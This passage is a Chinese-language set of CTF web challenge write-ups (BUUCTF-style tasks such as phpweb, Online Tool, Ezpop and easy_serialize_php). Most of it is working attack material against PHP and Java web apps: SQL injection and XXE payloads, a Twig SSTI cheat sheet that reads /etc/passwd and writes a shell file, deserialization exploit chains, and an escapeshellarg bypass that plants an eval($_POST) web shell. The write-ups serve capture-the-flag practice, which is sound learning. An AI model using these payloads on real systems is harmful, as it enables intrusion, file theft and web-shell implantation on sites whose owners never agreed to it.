return: adminc7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ecO:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:123;s:4:"blog";s:7:"123.php";} 
```

发现`data`字段为`UserInfo`序列化后的数据

在这里我们是不是可以利用一下呢？于是我们对这个序列化后的内容稍作改动

```
O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:19;s:4:"blog";s:29:"file:///var/www/html/flag.php";}
```

然后构造payload:

```
?no=-1 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:19;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'
```

然后我们查看源码，发现读出来的数据，`base64`解密获得`flag`

[参考](https://www.cnblogs.com/junlebao/p/14104036.html)

## [RoarCTF 2019]Easy Java

题目是登陆页面，查看源码，发现一个连接`Download?filename=help.docx`，跳转到帮助文档。
点击help也可以跳转到帮助文档。
帮助文档内容为`java.io.FileNotFoundException:{help.docx}`，是java语句，帮助文档不存在。

#### [WEB-INF知识点](https://www.cnblogs.com/darkcyan/p/17668377.html#web-inf知识点)

`WEB-INF`是`java`的`WEB`应用的安全目录，此外如果想在页面访问`WEB-INF`应用里面的文件，必须要通过`web.xml`进行相应的映射才能访问。
其中敏感目录举例：

> `/WEB-INF/web.xml`：`Web`应用程序配置文件，描述了 `servlet` 和其他的应用组件配置及命名规则
> `/WEB-INF/classes/`：含了站点所有用的 `class`文件，包括`servlet class` 和非`servlet class`，他们不能包含在`.jar`文件中
> `/WEB-INF/lib/`：存放`web`应用需要的各种`JAR`文件，放置仅在这个应用中要求使用的`jar`文件,如数据库驱动`jar`文件
> `/WEB-INF/src/`：源码目录，按照包名结构放置各个`java`文件
> `/WEB-INF/database.properties`：数据库配置文件

简单来说，`java web`是基于`Tomcat`服务器搭建的，通过`servlet`来开发。
狭义来说，`servlet`是指`Java`语言实现的一个接口。

访问方式

> `<servlet-class>`  这个就是指向我们要注册的`servlet` 的类地址, 要带包路径
>
> `<servlet-mapping>`  是用来配置我们注册的组件的访问路径,里面包括两个节点 一个是`<servlet-name>`，这个要与前面写的`servlet`一致 另一个是`<url-pattern>`，配置这个组件的访问路径 `<servlet-name>` 这个是我们要注册`servlet`的名字,一般跟`Servlet`类名有关
>
> 举个例子
> <servlet>
> <servlet-name>FlagController</servlet-name>
> <servlet-class>com.wm.ctf.FlagController</servlet-class>
> </servlet>

`servlet`包含了路径信息，我们尝试包含一下`FlagController`所在路径，不过这次要在前面加上`classes`来访问来访问`class`文件目录（详见上面的目录结构），且文件后缀为`.class`

首先去找`WEB-INF/web.xml`

需要用`POST`方法

![image-20231112224219961](.\img\9-1.png)

![image-20231112224529720](.\img\9-2.png)

[参考](https://www.cnblogs.com/darkcyan/p/17668377.html)

## [BJDCTF2020]The mystery of ip

`SSTI注入`

输入什么回显什么，测试加`'`加`or '1=1'`都回显的是本身的内容，测试模板注入`{{1+2}}`发现回显`3`

```
{{system('ls')}}
{{system('cat /flag')}}
```

## [网鼎杯 2020 朱雀组]phpweb

这里那么多函数被禁了，主要还是禁了`system`比较难受，但是问题不大，毕竟没有禁`file_get_contents`、`cat`以及`serialize`。

`file_get_contents`读取`index.php`

```php
<?php
    $disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
    function gettime($func, $p) {
        $result = call_user_func($func, $p);
        $a= gettype($result);
        if ($a == "string") {
            return $result;
        } else {return "";}
    }
    class Test {
        var $p = "Y-m-d h:i:s a";
        var $func = "date";
        function __destruct() {
            if ($this->func != "") {
                echo gettime($this->func, $this->p);
            }
        }
    }
    $func = $_REQUEST["func"];
    $p = $_REQUEST["p"];

    if ($func != null) {
        $func = strtolower($func);
        if (!in_array($func,$disable_fun)) {
            echo gettime($func, $p);
        }else {
            die("Hacker...");
        }
    }
    ?>
```

构造反序列化`Test`类

```php
<?php

class Test {
    var $p = "ls /";
    var $func = "system";
    function __destruct() {
        if ($this->func != "") {
            echo gettime($this->func, $this->p);
        }
    }
}
$a = new Test();
echo serialize($a);
```

![image-20231112230555837](.\img\10-1.png)

```php
<?php

class Test {
    var $p = "find / -name 'flag*'";
    var $func = "system";
    function __destruct() {
        if ($this->func != "") {
            echo gettime($this->func, $this->p);
        }
    }
}
$a = new Test();
echo serialize($a);
```

`O:4:"Test":2:{s:1:"p";s:20:"find / -name 'flag*'";s:4:"func";s:6:"system";}`

![image-20231112230852512](.\img\10-2.png)

```php
`<?php

class Test {
    var $p = "cat /tmp/flagoefiu4r93";
    var $func = "system";
    function __destruct() {
        if ($this->func != "") {
            echo gettime($this->func, $this->p);
        }
    }
}
$a = new Test();
echo serialize($a);
```

``O:4:"Test":2:{s:1:"p";s:22:"cat /tmp/flagoefiu4r93";s:4:"func";s:6:"system";}`

## [BSidesCF 2020]Had a bad day

`文件包含`

`代码审计`

一道有点神奇的文件包含题

```
?category=php://filter/read=convert.base64-encode/resource=meowers/../flag
```

## [BUUCTF 2018]Online Tool

`escapeshellarg与escapeshellcmd绕过`

`HTTP_X_FORWARDED_FOR`和`REMOTE_ADDR`都是服务器用来获取`ip`用的，在本题没什么用。下面的代码才是重点。我们需要`host`传参，再经过下面两个函数的处理，最后拼接字符串执行`system`系统函数。`mkdir`函数创建新目录。

现在我们面临的有两个难题，第一个是`escapeshellarg()`和`escapeshellcmd()`函数的绕过，第二个是如何构造命令执行`payload`。

### 函数的绕过

回看上面的代码，如果没有那两个函数的处理，这题就变得简单多了，我们可以执行多参数命令，用`||`或者`;`将前面分割，后面写入我们想要执行的命令。而`escapeshellcmd()`就是阻止多参数命令执行的，因为一整个传参的内容都被当做一串字符串了。虽然命令语句只能执行一个，但是可以指定不同参数，比如

```php
$username = 'myuser1 myuser2';
system('groups '.$username);
=>
//myuser1 : myuser1 adm cdrom sudo
//myuser2 : myuser2 adm cdrom sudo
```

但是在escapeshellarg()函数处理后，就会被当做一个参数来执行命令了。（相关文章：[利用/绕过 PHP escapeshellarg/escapeshellcmd函数 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/107336)）

但它们组合使用时就会造成漏洞，就借用一个大佬的例子，通俗易懂。

```cobol
传入的参数是：172.17.0.2' -v -d a=1
经过escapeshellarg处理后变成了'172.17.0.2'\'' -v -d a=1'，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。
经过escapeshellcmd处理后变成'172.17.0.2'\\'' -v -d a=1\'，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义：http://php.net/manual/zh/function.escapeshellcmd.php
最后执行的命令是curl '172.17.0.2'\\'' -v -d a=1\'，由于中间的\\被解释为\而不再是转义字符，所以后面的'没有被转义，与再后面的'配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a=1'，即向172.17.0.2\发起请求，POST 数据为a=1'。
```

（相关文章链接：[PHP escapeshellarg()+escapeshellcmd() 之殇 (seebug.org)](https://paper.seebug.org/164/)）

也就是说，escapeshellcmd()函数转义了用于转义单引号的斜杠，导致这个单引号与后面的单引号形成了空白连接符就能执行命令了。

### `nmap`构造命令

`system`函数里拼接了`nmap`的指令字符串。`nmap`中的`-oG`参数可以将代码与命令写到文件中，比如`nmap <?php phpinfo();?> -oG 1.php`，就是将这个`phpinfo();`语句写在了`1.php`里内了。

### 构造`payload`

`payload`构造如下

最后需要有`空格`

```php
?host='<?php eval($_POST[1]);?> -oG 1.php '
```

[参考](https://blog.csdn.net/m0_62422842/article/details/125451022)

## [BJDCTF2020]ZJCTF，不过如此

题目代码

```php
<?php

error_reporting(0);
$text = $_GET["text"];
$file = $_GET["file"];
if(isset($text)&&(file_get_contents($text,'r')==="I have a dream")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        die("Not now!");
    }

    include($file);  //next.php
    
}
else{
    highlight_file(__FILE__);
}
?>
```

使用`Payload`读取`next.php`

```
?text=data://text/plain,I have a dream&file=php://filter/read=convert.base64-encode/resource=next.php
```

这里主要涉及到`preg_replace`的一个RCE漏洞，参考：<https://xz.aliyun.com/t/2557>

```
preg_replace( '/(' . $re . ')/ei','strtolower("\\1")', $str);
```

主要就是构造`preg_replace('.*')/ei','strtolower("\\1")', {${此处填函数名}});`
大概就是把所有字符替换为函数执行结果。
但是`GET`传`.*=xxx`会出问题，自动将第一个非法字符转化为下划线（看链接），所以构造：

```
http://64ee684e-c7fe-41b5-b2a0-d0ae5c29e1f2.node4.buuoj.cn:81/next.php?\S*=${eval($_POST[1])}
```

同时`POST`一个`1=system('ls');`

## [GXYCTF2019]禁止套娃

`git泄露`

`无参RCE`

`git`下载后`index.php`内容如下

```php
<?php
include "flag.php";
echo "flag在哪里呢？<br>";
if(isset($_GET['exp'])){
    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
                // echo $_GET['exp'];
                @eval($_GET['exp']);
            }
            else{
                die("还差一点哦！");
            }
        }
        else{
            die("再好好想想！");
        }
    }
    else{
        die("还想读flag，臭弟弟！");
    }
}
// highlight_file(__FILE__);
?>
```

过滤了伪协议，过滤了很多字符，过滤了参数

`Payload`

```
需要先查看一下当前的目录情况

scandir(current(localecnov())) 

localecnov() 函数返回一个包含本地数字及货币格式信息的数组。相当于Linux的ls。(我上面放的链接也简单说了一下这个函数)。

scandir()就是列出目录中的文件和目录.

current() 返回数组中当前元素的值

exp=print_r(scandir(current(localeconv())));
return: Array ( [0] => . [1] => .. [2] => .git [3] => flag.php [4] => index.php )
```

使用反转数组函数:`array_reverse()`。再让指针指向下一个数组元素（第二个）`next()`

```
exp=print_r(next(array_reverse(scandir(current(localeconv())))));
return: flag.php
highlight_file(next(array_reverse(scandir(current(localeconv())))));
```

### chdir()

这个函数是用来跳目录的，有时想读的文件不在当前目录下就用这个来切换，因为`scandir()`会将这个目录下的文件和目录都列出来，那么利用操作数组的函数将内部指针移到我们想要的目录上然后直接用`chdir`切就好了，如果要向上跳就要构造`chdir('..')`

## [NCTF2019]Fake XML cookbook

看题目猜测是`XXE`

抓包看之后发现是`POST`的`XML`格式，尝试简单的`XXE`

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE foo [ 
<!ENTITY rabbit SYSTEM "file:///flag" >
]>
<user><username>&rabbit;</username><password>123</password></user>
```

成功获取`flag`

## [GWCTF 2019]我有一个数据库

进来没找到什么东西，扫目录发现`phpmyadmin`和`phpinfo.php`

`phpinfo.php`没啥东西，看看`phpmyadmin`

发现`phpmyadmin`的版本为`4.8.1`

![image-20231113103000681](.\img\11-1.png)

搜索一下有没有历史漏洞

文件包含获取`flag`

```
:81/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../flag
```

## [BJDCTF2020]Mark loves cat

`git泄露`

`githacker`获取源码

```php
<?php

include 'flag.php';

$yds = "dog";
$is = "cat";
$handsome = 'yds';

foreach($_POST as $x => $y){
    $$x = $y;
}

foreach($_GET as $x => $y){
    $$x = $$y;
}

foreach($_GET as $x => $y){
    if($_GET['flag'] === $x && $x !== 'flag'){
        exit($handsome);
    }
}

if(!isset($_GET['flag']) && !isset($_POST['flag'])){
    exit($yds);
}

if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){
    exit($is);
}
```

`flag.php`为

```php
<?php

$flag = file_get_contents('/flag');
```

#### 1.利用handsome

`/?handsome=flag`
通过如下
`$handsome=$flag`
从而成功获取`flag`
为满足条件退出追加两个参数 `x=flag&flag=x`

```php
foreach($_GET as $x => $y){
    $$x = $$y; //GET型变量重新赋值为当前文件变量中以其值为键名的值
}
foreach($_GET as $x => $y){
    if($_GET['flag'] === $x && $x !== 'flag'){ //如果GET型中flag变量的值等于GET型中一个不为flag的键名则退出
        
        exit($handsome); //exit显然能利用
    }
}
```

#### 2.利用yds

比较简单 直接 `/?yds=flag`即可

```php
foreach($_GET as $x => $y){
    $$x = $$y; //GET型变量重新赋值为当前文件变量中以其值为键名的值
}
 //如果GET型和POST型中都没有变量flag,则退出
if(!isset($_GET['flag']) && !isset($_POST['flag'])){ 
    exit($yds);
}
```

#### 利用is

/?is=flag&flag=flag

```php
if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){
    exit($is);
}
```

[参考](https://juejin.cn/post/7091558373337858079)

## [WUSTCTF2020]朴实无华

在`robots.txt`中发现文件`/fAke_f1agggg.php`

`bp`转包在相应头中发现`/f14g.php`

访问发现

```php
if (isset($_GET['num'])){
    $num = $_GET['num'];
    if(intval($num) < 2020 && intval($num + 1) > 2021){
        echo "我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.</br>";
    }else{
        die("金钱解决不了穷人的本质问题");
    }
}else{
    die("去非洲吧");
}
//level 2
if (isset($_GET['md5'])){
   $md5=$_GET['md5'];
   if ($md5==md5($md5))
       echo "想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.</br>";
   else
       die("我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲");
}else{
    die("去非洲吧");
}

//get flag
if (isset($_GET['get_flag'])){
    $get_flag = $_GET['get_flag'];
    if(!strstr($get_flag," ")){
        $get_flag = str_ireplace("cat", "wctf2020", $get_flag);
        echo "想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.</br>";
        system($get_flag);
    }else{
        die("快到非洲了");
    }
}else{
    die("去非洲吧");
}
?>
```

`intval`函数，此函数在处理数据时会在接触到字符串时停止，因此如果输入`100e2`之类的数据，会解释称`100`，但后面在执行`+1`时，`100e2`是解释称`10000`的，因此此处使用`100e2`绕过，结果如下：

`md5`与自己的`md5`值相同,均为`0e`开头即可

```
0e215962017
```

最后`get_flag`这里过滤了`空格`和`cat`

`空格`用`$IFS$9`绕过

`cat`用`tac`或者`ca?`绕过

```
fl4g.php?num=100e2&md5=0e215962017&get_flag=tac$IFS$9fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag 
```

## [BJDCTF2020]Cookie is so stable

`SSTI注入`

和之前一题`SSTI`注入比较相似，但是这题过滤了`+`

测试`cookie`中的`user={{3*3}}`

返回`Hello 9`

说明存在模板注入

确定服务端的语言为`php`之后，范围就很小了，补充下各种语言发生`ssti注入`的模板，如下：

```c
python: jinja2 mako tornado django
php:smarty twig Blade
java:jade velocity jsp
```

 7、确定此处产生`ssti注入`的模板可以为`smarty`、`twig`等，那就一个一个尝试，这里就直接使用`twig`模板的注入方式进行注入了，`payload`：`{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}`即可成功注入

`twig`常用的注入`payload`：

```c
{{'/etc/passwd'|file_excerpt(1,30)}}
{{app.request.files.get(1).__construct('/etc/passwd','')}}
{{app.request.files.get(1).openFile.fread(99)}}
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("whoami")}}
{{_self.env.enableDebug()}}{{_self.env.isDebug()}}
{{["id"]|map("system")|join(",")
{{{"<?php phpinfo();":"/var/www/html/shell.php"}|map("file_put_contents")}}
{{["id",0]|sort("system")|join(",")}}
{{["id"]|filter("system")|join(",")}}
{{[0,0]|reduce("system","id")|join(",")}}
{{['cat /etc/passwd']|filter('system')}}
```

[参考](https://www.cnblogs.com/upfine/p/16534494.html)

## [安洵杯 2019]easy_web

`md5强比较`

题目首页

![image-20231113113536861](./img/12-2.png)

源码中会显示图片的`base64`内容

发现参数`img`和`cmd`，且`img`中有参数看起来像`base64`解密后结果为`555.png`

那么就可以想到将图片文件名编码后的值改为我们需要查看文件的文件名编码后的值，然后查看`base64`编码，即可获取我们想要的内容

尝试将内容改为`index.php`并反过来加密

![image-20231113113520100](./img/12-1.png)

![image-20231113113858671](./img/12-3.png)

![image-20231113113918001](./img/12-4.png)

将响应包中的内容`base64`解码后为

```php
<?php
error_reporting(E_ALL || ~ E_NOTICE);
header('content-type:text/html;charset=utf-8');
$cmd = $_GET['cmd'];
if (!isset($_GET['img']) || !isset($_GET['cmd'])) 
    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');
$file = hex2bin(base64_decode(base64_decode($_GET['img'])));

$file = preg_replace("/[^a-zA-Z0-9.]+/", "", $file);
if (preg_match("/flag/i", $file)) {
    echo '<img src ="./ctf3.jpeg">';
    die("xixiï½ no flag");
} else {
    $txt = base64_encode(file_get_contents($file));
    echo "<img src='data:image/gif;base64," . $txt . "'></img>";
    echo "<br>";
}
echo $cmd;
echo "<br>";
if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd)) {
    echo("forbid ~");
    echo "<br>";
} else {
    if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {
        echo `$cmd`;
    } else {
        echo ("md5 is funny ~");
    }
}

?>
<html>
<style>
  body{
   background:url(./bj.png)  no-repeat center center;
   background-size:cover;
   background-attachment:fixed;
   background-color:#CCCCCC;
}
</style>
<body>
</body>
</html>
```

```
a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2

a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
```

`ls`可以用`l\s`绕过,`cat`同理`ca\t`

![image-20231113114641215](./img/12-5.png)

![image-20231113114809799](./img/12-6.png)

## [MRCTF2020]Ezpop

`php代码审计`

```php
<?php

class Modifier {
    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
}

class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }
}
```

魔术方法`__invoke`被自动调用的条件是类被当成一个函数被调用，故接着来寻找和函数调用有关的代码。`Test`类中的`__get()`方法可以调用

```php
public function __get($key){
    $function = $this->p;
    return $function();
}
```

`__get`方法又需要访问类中不存在的变量时调用，那就需要寻找和调用属性相关的代码。`Show`类中的`__toString()`方法可以调用

```php
class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}
```

魔术方法`__toString`在类被当做一个字符串处理时会被自动调用，在魔术方法`__wakeup`则将属性`source`传入正则匹配函数`preg_match()`，在这个函数中`source`属性就被当做字符串处理。最终这个魔术方法_`_wakeup`又在类被反序列化时自动调用

`反序列化`->`调用Show类中魔术方法__wakeup`->`preg_match()函数对Show类的属性source处理-`>`调用Show类中魔术方法__toString`->`返回Show类的属性str中的属性source(此时这里属性source并不存在)`->`调用Test类中魔术方法__get`->`返回Test类的属性p的函数调用结果`->`调用Modifier类中魔术方法__invoke`->`include()函数包含目标文件(flag.php)`

`exp`

```php
<?php

class Modifier {
    protected  $var="php://filter/read=convert.base64-encode/resource=flag.php";
}

class Show{
    public $source;
    public $str;
}

class Test{
    public $p;
}

$a = new Show();
$b = new Show();
$b->str = new Test();
$b->str->p = new Modifier();
$a->source = $b;

echo serialize($a);
echo urlencode(serialize($a));
```

## [强网杯 2019]高明的黑客

访问`www.tar.gz`下载了一套源码，有3002个文件，只有一个`index.html`是正常文件，其余都是看似乱码的php，翻了两三遍目录发现毫无收获，打开一个看看这些文件的内容是不是有什么玄机吧。

```php
<?php
$_GET['jVMcNhK_F'] = ' ';
system($_GET['jVMcNhK_F'] ?? ' ');
$_GET['tz2aE_IWb'] = ' ';
echo `{$_GET['tz2aE_IWb']}`;
$_GET['cXjHClMPs'] = ' ';
echo `{$_GET['cXjHClMPs']}`;
```

`exp`

```python
import os
import requests
import re
import threading
import time

print('开始时间：  '+  time.asctime( time.localtime(time.time()) ))
s1=threading.Semaphore(100)                                            #这儿设置最大的线程数
filePath = r"D:/soft/phpstudy/PHPTutorial/WWW/src/"
os.chdir(filePath)                                                    #改变当前的路径
requests.adapters.DEFAULT_RETRIES = 5                                #设置重连次数，防止线程数过高，断开连接
files = os.listdir(filePath)
session = requests.Session()
session.keep_alive = False                                             # 设置连接活跃状态为False
def get_content(file):
    s1.acquire()                                                
    print('trying   '+file+ '     '+ time.asctime( time.localtime(time.time()) ))
    with open(file,encoding='utf-8') as f:                            #打开php文件，提取所有的$_GET和$_POST的参数
            gets = list(re.findall('\$_GET\[\'(.*?)\'\]', f.read()))
            posts = list(re.findall('\$_POST\[\'(.*?)\'\]', f.read()))
    data = {}                                                        #所有的$_POST
    params = {}                                                        #所有的$_GET
    for m in gets:
        params[m] = "echo 'xxxxxx';"
    for n in posts:
        data[n] = "echo 'xxxxxx';"
    url = 'http://127.0.0.1/src/'+file
    req = session.post(url, data=data, params=params)            #一次性请求所有的GET和POST
    req.close()                                                # 关闭请求  释放内存
    req.encoding = 'utf-8'
    content = req.text
    #print(content)
    if "xxxxxx" in content:                                    #如果发现有可以利用的参数，继续筛选出具体的参数
        flag = 0
        for a in gets:
            req = session.get(url+'?%s='%a+"echo 'xxxxxx';")
            content = req.text
            req.close()                                                # 关闭请求  释放内存
            if "xxxxxx" in content:
                flag = 1
                break
        if flag != 1:
            for b in posts:
                req = session.post(url, data={b:"echo 'xxxxxx';"})
                content = req.text
                req.close()                                                # 关闭请求  释放内存
                if "xxxxxx" in content:
                    break
        if flag == 1:                                                    #flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，
            param = a
        else:
            param = b
        print('找到了利用文件： '+file+"  and 找到了利用的参数：%s" %param)
        print('结束时间：  ' + time.asctime(time.localtime(time.time())))
    s1.release()

for i in files:                                                            #加入多线程
   t = threading.Thread(target=get_content, args=(i,))
   t.start()
```

![image-20231113175907317](./img/13-1.png)

![image-20231113175929569](./img/13-2.png)

## [安洵杯 2019]easy_serialize_php

`代码审计`

`php反序列化`

`反序列化字符串逃逸`

`变量覆盖`

```php
<?php

$function = @$_GET['f'];

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}


if($_SESSION){
    unset($_SESSION);
}

$_SESSION["user"] = 'guest';
$_SESSION['function'] = $function;

extract($_POST);

if(!$function){
    echo '<a href="index.php?f=highlight_file">source_code</a>';
}

if(!$_GET['img_path']){
    $_SESSION['img'] = base64_encode('guest_img.png');
}else{
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
}

$serialize_info = filter(serialize($_SESSION));

if($function == 'highlight_file'){
    highlight_file('index.php');
}else if($function == 'phpinfo'){
    eval('phpinfo();'); //maybe you can find something in here!
}else if($function == 'show_image'){
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo['img']));
}
```

在`phpinfo`中找到了，`auto_append_file`说明自动在文件中执行该文件代码，说明要读取这个文件

![image-20231113180630471](./img/13-3.png)

 `extract($_POST)`就是将`post`的内容作为这个函数的参数。

然后就是变量覆盖。**如果`post`传参为`_SESSION[flag]=123`，那么`$_SESSION["user"]`和`$_SESSION["function"]`的值都会被覆盖**。

至于为什么`post`要传`_SESSION[flag]=123`而不是`$_SESSION[flag]=123`，是因为`_SESSION`是变量名，如果传`$_SESSION`，那么就会失效。

这样才会进行序列化

```php
$_SESSION["user"] = 'guest';
$_SESSION['function'] = $function;
$_SESSION['img']=base64_encode('guest_img.png');
```

这里将下面的东西进行序列化

```php
$_SESSION["user"] = 'guest';
$_SESSION['function'] = 'a';
$_SESSION['img'] = 'ZDBnM19mMWFnLnBocA==';//d0g3_f1ag.php base64编码
var_dump(serialize($_SESSION));
//得到
string(90) "a:3:{s:4:"user";s:5:"guest";s:8:"function";s:1:"a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
```

将这里的user和function进行修改，然后这里会进行代码一开始的过滤，将变量$img中的php flag php5 php4 fl1g的字符串替换成’'空字符

```php
$_SESSION["user"] = 'flagflagflagflagflagflag';
$_SESSION['function'] = 'a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";}';
$_SESSION['img'] = 'ZDBnM19mMWFnLnBocA=='; // d0g3_f1ag.php base64编码
序列化后
```

```
a:3:{s:4:"user";s:24:"flagflagflagflagflagflag";s:8:"function";s:59:"a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";}";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
```

将flag进行了过滤

```
a:3:{s:4:"user";s:24:"#";s:8:"function";s:59:"a#";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";}";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
```

由于`s:24`会往后边读取`24`位字符`";s:8:"function";s:59:"a`做为`user`的属性值, #号包含起来的部分，读取到a的时候结束，后面的;进行了闭合，相当于吞掉了一个属性和值，接着会继续读取我们构造的img，由于总共三个属性，我在后边加上了一个属性和值，后边的序列化结果直接就被丢弃

payload：

```
_SESSION[user]=flagflagflagflagflagflag&_SESSION[function]=a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";}
```

得到了flag in `/d0g3_fllllllag`

`/d0g3_fllllllag` `base64编码` `L2QwZzNfZmxsbGxsbGFn`

payload：

```
_SESSION[user]=flagflagflagflagflagflag&_SESSION[function]=a";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";s:2:"dd";s:1:"a";}
```

[参考](https://www.cnblogs.com/v2ish1yan/articles/16118319.html)

## [SWPU2019]Web1

`group by`判断列数

```
1'/**/group/**/by/**/n,
```

information_schema还有or，因为or被过滤，因此也无法使用。所以这里只能采用innodb_index_stats和 innodb_table_stats来进行绕过。payload：

```
1'union/**/select/**/1,2,group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_table_stats/**/where/**/database_name='web1'&&'1'='1
```

进行匿名获取flag值，payload：

```
1'/**/union/**/select/**/1,(select/**/group_concat(c)/**/from/**/(select/**/1/**/as/**/a,2/**/as/**/b,3/**/as/**/c/**/union/**/select/**/*/**/from/**/users)n),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&&'1'='1
```

，或者payload：

```
1'/**/union/**/select/**/1,(select/**/group_concat(`3`)/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/users)n),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&&'1'='1
```

其中group_concat(参数)，对参数进行修改，访问每一个字段，结果如下：

## [CISCN 2019 初赛]Love Math

`代码审计`

```php
<?php
error_reporting(0);
//听说你很喜欢数学，不知道你是否爱它胜过爱flag
if(!isset($_GET['c'])){
    show_source(__FILE__);
}else{
    //例子 c=20-1
    $content = $_GET['c'];
    if (strlen($content) >= 80) {
        die("太长了不会算");
    }
    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
    foreach ($blacklist as $blackitem) {
        if (preg_match('/' . $blackitem . '/m', $content)) {
            die("请不要输入奇奇怪怪的字符");
        }
    }
    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
